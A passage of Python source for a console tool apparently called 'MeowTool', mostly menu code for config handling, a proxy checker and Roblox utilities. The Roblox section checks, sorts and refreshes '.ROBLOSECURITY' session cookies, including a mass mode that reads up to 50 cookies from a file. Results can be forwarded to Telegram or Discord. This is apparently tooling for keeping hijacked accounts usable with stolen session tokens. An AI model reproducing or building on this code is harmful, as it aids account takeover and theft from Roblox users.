                if not os.path.exists(f'Settings\\Configs\\{choosedConfig}.toml'):
                    return await errorOrCorrectHandler(True, 5, f'{MT_File_Is_Missing}...',            f'{MT_Settings}\\{MT_Configs}\\{choosedConfig}')
                if newNameOfConfig.lower() in listOfExistsConfigs:
                    return await errorOrCorrectHandler(True, 5, MT_File_With_This_Name_Already_Exists, f'{MT_Settings}\\{MT_Configs}\\{choosedConfig}')

                os.rename(f'Settings\\Configs\\{choosedConfig}.toml', f'Settings\\Configs\\{newNameOfConfig}.toml')
                if configLoader['Loader']['Load_Config']    == choosedConfig: configLoader['Loader']['Load_Config']    = newNameOfConfig
                if configLoader['Loader']['Current_Config'] == choosedConfig: configLoader['Loader']['Current_Config'] = newNameOfConfig
                open('Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
                whileTrueStage3 = False
                await removeLines(5)
            case '5':
                os.makedirs('Settings\\Configs', exist_ok=True)
                os.startfile('Settings\\Configs')
                await removeLines(13)
            case 'R' | 'К':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStage4 = True
                    await removeLines(13)
                    while whileTrueStage4:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Configs}\\{choosedConfig}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                whileTrueStage4 = False
                                try: os.remove(f'Settings\\Configs\\{choosedConfig}.toml')
                                except Exception: pass
                                loadConfig(choosedConfig)
                            case 'N' | 'Т':
                                whileTrueStage4 = False

                        await removeLines(8)
                else:
                    try: os.remove(f'Settings\\Configs\\{choosedConfig}.toml')
                    except Exception: pass
                    loadConfig(choosedConfig)
                    await removeLines(13)
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStage4 = True
                    await removeLines(13)
                    while whileTrueStage4:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Configs}\\{choosedConfig}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                whileTrueStage3 = False
                                whileTrueStage4 = False
                                try: os.remove(f'Settings\\Configs\\{choosedConfig}.toml')
                                except Exception: pass
                                if configLoader['Loader']['Current_Config'] not in configFiles() or len(configFiles()) == 0: loadConfig('default')
                            case 'N' | 'Т':
                                whileTrueStage4 = False

                        await removeLines(8)
                else:
                    whileTrueStage3 = False
                    try: os.remove(f'Settings\\Configs\\{choosedConfig}.toml')
                    except Exception: pass
                    if configLoader['Loader']['Current_Config'] not in configFiles() or len(configFiles()) == 0: loadConfig('default')
                    await removeLines(13)
            case '0':
                whileTrueStage3 = False
                await removeLines(13)
            case 'F' | 'А':
                await cls()
                await lableASCII()
            case _:
                await removeLines(13)

async def mainMenu():
    await updateFixer_v2_0_0() # ‾\/‾ # Временно до v3.0.0
    await updateFixer_v2_1_0() # _/

    consoleTitle = config['General']['Console_Title']
    if str(consoleTitle).strip() == '' or len(str(consoleTitle)) > 50 or any(char in str(consoleTitle) for char in ['<', '>', '|', '^', '&']):
        os.system('title MeowTool... Meow :3')
    else:
        os.system(f'title {consoleTitle}')

    await cls()
    await lableASCII()

    while True:
        # Главное меню
        amountRemoveLines = 10
        welcomeString     = ''
        userName = str(configLoader['MeowTool']['Username']).strip()
        if userName:
            amountRemoveLines = 12
            welcomeString     = f'  {ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD} {MT_Hi}, {ANSI.FG.PINK}{userName}{ANSI.CLEAR + ANSI.DECOR.BOLD}! :3\n\n'
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{ANSI.CLEAR}\n\n{ANSI.DECOR.BOLD}{welcomeString} [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Proxy}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Roblox}\n  ┃\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Settings}\n [{ANSI.FG.YELLOW}I{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_About_The_Program}\n [{ANSI.FG.RED}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Close_Program}{ANSI.CLEAR}\n\n')
        mainTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match mainTab:
            # Прокси
            case '1':
                whileTrueStage1 = True
                await removeLines(amountRemoveLines)
                while whileTrueStage1:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Proxy}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    proxyTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    match proxyTab.upper():
                        # Прокси Чекер
                        case '1':
                            whileTrueStage2 = True
                            await removeLines(7)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Proxy}\\{MT_Checker}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ proxies ({await amountOfLines('Proxy\\Checker\\proxies')})\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ http_valid ({await amountOfLines('Proxy\\Checker\\http_valid')})\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ http_invalid ({await amountOfLines('Proxy\\Checker\\http_invalid')})\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ socks4_valid ({await amountOfLines('Proxy\\Checker\\socks4_valid')})\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ socks4_invalid ({await amountOfLines('Proxy\\Checker\\socks4_invalid')})\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ socks5_valid ({await amountOfLines('Proxy\\Checker\\socks5_valid')})\n [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ socks5_invalid ({await amountOfLines('Proxy\\Checker\\socks5_invalid')})\n [{ANSI.FG.PINK}8{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ custom_valid ({await amountOfLines('Proxy\\Checker\\custom_valid')})\n [{ANSI.FG.PINK}9{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ unknown_invalid ({await amountOfLines('Proxy\\Checker\\unknown_invalid')})\n  ┃\n [{ANSI.FG.YELLOW}U{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                proxyCheckerTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match proxyCheckerTab.upper():
                                    case '1': await proxyChecker('proxies')
                                    case '2': await proxyChecker('http_valid')
                                    case '3': await proxyChecker('http_invalid')
                                    case '4': await proxyChecker('socks4_valid')
                                    case '5': await proxyChecker('socks4_invalid')
                                    case '6': await proxyChecker('socks5_valid')
                                    case '7': await proxyChecker('socks5_invalid')
                                    case '8': await proxyChecker('custom_valid')
                                    case '9': await proxyChecker('unknown_invalid')
                                    case '0':
                                        whileTrueStage2 = False
                                        await removeLines(16)
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                        await removeLines(16)
                                    case _:   
                                        await removeLines(16)
                        case '0':
                            whileTrueStage1 = False
                            await removeLines(7)
                        case 'F' | 'А':
                            await cls()
                            await lableASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                            await removeLines(7)
                        case _:   
                            await removeLines(7)
            # Роблокс
            case '2':
                whileTrueStage1 = True
                await removeLines(amountRemoveLines)
                while whileTrueStage1:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Checker}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Sorter}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Refresher}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Transaction_Analysis}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Control_Panel}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Misc}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    robloxTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    match robloxTab.upper():
                        # Роблокс Куки Чекер
                        case '1':
                            whileTrueStage2 = True
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Checker}{ANSI.CLEAR}\n\n')
                                RCCFiles = await printFiles('Cookie_Checker', 'Roblox\\Cookie Checker', True)
                                sys.stdout.write(f'{ANSI.DECOR.BOLD}{'  ┃\n' if RCCFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                robloxCookieCheckerTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                if robloxCookieCheckerTab == '0': whileTrueStage2 = False
                                elif robloxCookieCheckerTab.isdigit() and int(robloxCookieCheckerTab) <= len(RCCFiles):
                                    await robloxCookieChecker(RCCFiles[int(robloxCookieCheckerTab) - 1])
                                match robloxCookieCheckerTab.upper():
                                    case 'S' | 'Ы':
                                        config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                    case 'T' | 'Е':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])

                                await autoSaveConfigAndRemoveLinesInSettings(robloxCookieCheckerTab.upper(), ('S', 'Ы', 'P', 'З', 'T', 'Е', 'D', 'В'), (), 0)
                                await cls()
                                await lableASCII()
                        # Роблокс Куки Сортер
                        case '2':
                            whileTrueStage2 = True
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Sorter}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Start_Sorting}\n  ┃\n [{ANSI.FG.YELLOW}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                robloxCookieSorterTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match robloxCookieSorterTab.upper():
                                    case '1':
                                        await robloxCookieSorter()
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                    case 'T' | 'Е':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] ^= True
                                    case '0':
                                        whileTrueStage2 = False
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        await removeLines(10)

                                await autoSaveConfigAndRemoveLinesInSettings(robloxCookieSorterTab.upper(), ('P', 'З', 'T', 'Е', 'D', 'В'), ('0', 'R', 'К'), 10)
                        # Роблокс Куки Рефрешер
                        case '3':
                            whileTrueStage2 = True
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Refresher}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Single_Mode}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Mass_Mode}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                robloxCookieRefresherTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match robloxCookieRefresherTab.upper():
                                    # Одиночный режим
                                    case '1':
                                        await removeLines(8)
                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                        robloxCookieRefresherCookieEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Cookie[0]}:{ANSI.CLEAR} ')

                                        async def refresherSingleModeCookie():
                                            if robloxCookieRefresherCookieEnter == '0': return await removeLines(5)
                                            if not search(COOKIE_PATTERN, robloxCookieRefresherCookieEnter):
                                                return await errorOrCorrectHandler(True, 3, MT_Incorrect_Cookie, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}')

                                            await cls()
                                            await lableASCII()
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Wait[0]}...{ANSI.CLEAR}\n')

                                            cookie = {'.ROBLOSECURITY': robloxCookieRefresherCookieEnter}

                                            try:
                                                isSetCookie = await startSingleModeRCR(cookie)

                                                newCookie = search(COOKIE_PATTERN, str(isSetCookie)).group(0)[:-1]

                                                if not newCookie:
                                                    await cls()
                                                    await lableASCII()
                                                    return await errorOrCorrectHandler(True, 0, MT_Invalid_Cookie, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}')
                                            except (KeyError, TypeError, ContentTypeError):
                                                await cls()
                                                await lableASCII()
                                                return await errorOrCorrectHandler(True, 0, MT_Invalid_Cookie, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}')

                                            dateOfSingleModeRefreshing = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')

                                            os.makedirs(f'Roblox\\Cookie Refresher\\Single Mode\\outputs\\{dateOfSingleModeRefreshing}', exist_ok=True)
                                            if 1 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode']:
                                                open(f'Roblox\\Cookie Refresher\\Single Mode\\outputs\\{dateOfSingleModeRefreshing}\\refreshed_cookies_mode_1.txt', 'a', encoding='UTF-8').write(f'{robloxCookieRefresherCookieEnter[115:130]}...{robloxCookieRefresherCookieEnter[-15:-1]} -> {newCookie}\n')
                                            if 2 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode']:
                                                open(f'Roblox\\Cookie Refresher\\Single Mode\\outputs\\{dateOfSingleModeRefreshing}\\refreshed_cookies_mode_2.txt', 'a', encoding='UTF-8').write(f'{newCookie}\n')
                                            if 3 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode']:
                                                os.makedirs(f'Roblox\\Cookie Refresher\\Single Mode\\outputs\\{dateOfSingleModeRefreshing}\\refreshed_cookies_mode_3', exist_ok=True)
                                                open(f'Roblox\\Cookie Refresher\\Single Mode\\outputs\\{dateOfSingleModeRefreshing}\\refreshed_cookies_mode_3\\{robloxCookieRefresherCookieEnter[115:130]}...{robloxCookieRefresherCookieEnter[-15:-1]}.txt', 'a', encoding='UTF-8').write(f'{newCookie}\n')

                                            config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] = dateOfSingleModeRefreshing
                                            await autoSaveConfig()
                                            await removeLines(3)
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n{newCookie}\n\n')
                                            await waitingInput()

                                        await refresherSingleModeCookie()
                                    # Массовые режимы
                                    case '2':
                                        whileTrueStage3 = True
                                        await removeLines(8)
                                        while whileTrueStage3:
                                            try:               nextRefresh = datetime.strptime(config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'], '%d.%m.%Y - %H.%M.%S') + timedelta(minutes=1)
                                            except ValueError: nextRefresh = ''
                                            datetimeNow = datetime.now()
                                            statusOfRefresh = f'{MT_Status}: {ANSI.FG.GREEN}{MT_Can_Run}{ANSI.CLEAR + ANSI.DECOR.BOLD}' if not nextRefresh or nextRefresh < datetimeNow else f'{MT_Status}: {ANSI.FG.RED}{MT_Wait[0]} {abs(int((datetimeNow - nextRefresh).total_seconds()))} {MT_Seconds}.{ANSI.CLEAR + ANSI.DECOR.BOLD}'
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_50_Cookies_In_Once}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_50_Cookies_In_60_Seconds}\n  ┃\n [{ANSI.FG.RED if nextRefresh and nextRefresh > datetimeNow else ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {statusOfRefresh}\n [{ANSI.FG.YELLOW}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')    
                                            robloxCookieRefresherMassModeTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match robloxCookieRefresherMassModeTab.upper():
                                                case '1':
                                                    async def refresherMassModeOnly50Cookie():
                                                        if config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] != '' and nextRefresh > datetime.now():
                                                            return await errorOrCorrectHandler(True, 12, f'{MT_Wait[0]} {abs(int((nextRefresh - datetime.now()).total_seconds()))} {MT_Seconds}.', f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')
                                                        if not os.path.exists('Roblox\\Cookie Refresher\\Mass Mode\\cookies.txt'):
                                                            return await errorOrCorrectHandler(True, 12, MT_No_Cookies_Found, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')

                                                        dateOfMassMode1Refreshing = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')

                                                        refreshTasks = []
                                                        for cookie in open('Roblox\\Cookie Refresher\\Mass Mode\\cookies.txt', 'r', encoding='UTF-8').readlines():
                                                            if not search(COOKIE_PATTERN, cookie): continue
                                                            refreshTask = asyncio.create_task(startMassModeRCR(cookie.strip(), dateOfMassMode1Refreshing))
                                                            refreshTasks.append(refreshTask)
                                                            if len(refreshTasks) >= 50: break

                                                        if not refreshTasks:
                                                            return await errorOrCorrectHandler(True, 12, MT_No_Cookies_Found, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')

                                                        await removeLines(11)
                                                        sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINE1}cookies.txt{ANSI.CLEAR + ANSI.DECOR.BOLD}\':\n')

                                                        await asyncio.gather(*refreshTasks)

                                                        config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] = dateOfMassMode1Refreshing
                                                        await autoSaveConfig()

                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Checking_Complete}\n\n')
